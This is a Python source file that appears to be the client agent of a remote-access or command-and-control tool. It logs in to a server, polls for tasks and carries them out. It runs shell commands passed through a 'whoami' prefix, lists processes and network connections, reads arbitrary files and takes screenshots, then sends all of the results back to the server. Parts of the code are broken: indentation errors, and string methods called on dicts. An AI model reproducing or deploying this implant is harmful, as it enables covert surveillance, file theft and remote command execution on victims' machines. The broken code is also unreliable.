import socket
import json
import subprocess
import os
import psutil
import pyautogui
import io
import time
ip_server = '127.0.0.1' 
port_server = 22
def recv_message(sock):
    header = sock.recv(10)
    if not header:
        return None
    total_size = int(header.decode().strip())
    data = b""
    while len(data) < total_size:
        chunk = sock.recv(total_size - len(data))
        if not chunk:
            break
        data += chunk
    return json.loads(data.decode())
def get_process_list():
    procs_str = f"{'PID':<10} {'Name':<30}\n"
    procs_str += "-" * 40 + "\n"
    
    count = 0
    for proc in psutil.process_iter(['pid', 'name']):
        if count >= 10: 
            break
        try:
            p_info = proc.info
            procs_str += f"{p_info['pid']:<10} {p_info['name']:<30}\n"
            count += 1
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
            
    return procs_str.encode()
def send_screenshot():
    image = pyautogui.screenshot()
    image_buffer = io.BytesIO()
    image.save(image_buffer, format="png")
    image_bytes = image_buffer.getvalue()
    return image_bytes


def get_whoami(command):

    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            
        return output
            
    except Exception as e:
        return str(e).encode()
    
def get_file(file_path):
    try:
        if os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                return f.read() 
        else:
            return f"Error: File '{file_path}' not found.".encode()
    except Exception as e:
        return f"Error reading file: {e}".encode()
def get_network_connections():
    conn_str = f"{'Proto':<7} {'Local Address':<35} {'Remote Address':<35} {'Status':<15}\n"
    conn_str += "-" * 90 + "\n"
    
    try:
        connections = psutil.net_connections(kind='inet')
        
        for conn in connections[:15]: 
            proto = "TCP" if conn.type == socket.SOCK_STREAM else "UDP"
            
            l_addr = f"{conn.laddr.ip}:{conn.laddr.port}"
            
            if conn.raddr:
                r_addr = f"{conn.raddr.ip}:{conn.raddr.port}"
            else:
                r_addr = "N/A"
            
            conn_str += f"{proto:<7} {l_addr:<25} {r_addr:<25} {conn.status:<15}\n"
            
    except Exception as e:
        conn_str += f"Error: {e}\n"
        
    return conn_str.encode()
def handler_command(command):
    cmd_parts = command.strip().split(' ', 1) # מחלק למקסימום 2 חלקים
    base_cmd = cmd_parts[0].lower()
    
    if base_cmd == 'whoami':
        return get_whoami(command)
    elif base_cmd == 'processlist':
        return get_process_list()
    elif base_cmd == 'netstat':
        return get_network_connections()
    elif base_cmd == 'getfile':
        if len(cmd_parts) > 1:
            return get_file(cmd_parts[1]) 
        else:
            return b"Error: No file path provided."
    elif base_cmd == 'screenshot':
        try:
            image_bytes = send_screenshot() 
            return image_bytes
        except Exception as e:
            return f"Error taking screenshot: {e}".encode()

if __name__ == "__main__":
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((ip_server, port_server))

        msg = sock.recv(1024).decode()
        print(f"Server says: {msg}")#Login or Create format
        choice = input("Your choice (Login/Create): ")
        
        #sock.send(choice.encode())

        #format_msg = sock.recv(1024).decode()
        #print(f"Fill the fields: {format_msg}")#info json format
        
        name = input("Enter Name: ")
        password = input("Enter Password: ")
        payload = {"action":choice,"data":{"name":name,"password":password}}
        #auth_data = json.dumps({"name": name, "password": password})
        payload = json.dumps(payload)
        payload_bytes = payload.encode()
        header = f"{len(payload_bytes):<10}".encode()
        sock.send(header+payload_bytes)
        #sock.send(auth_data.encode())


        final_answer = recv_message(sock)  # מחזיר כבר dict
print(f"Final Status: {final_answer}")
agent_id = final_answer.get("agent_id")

        if "successfully" in final_answer.lower():
            while True:
                format = {"agent_id":agent_id,"request":"get_task"}
                sock.send(format.encode())





                command_from_server = sock.recv(1024).decode()
                print(command_from_server)
                if command_from_server.lower() == 'exit':
                    break
                
                result = handler_command(command_from_server)

                data_length = len(result)
                header = f"{data_length:<10}".encode()
                sock.send(header)
                sock.sendall(result)

    except Exception as e:
        print(f"Connection error: {e}")
    finally:
        sock.close()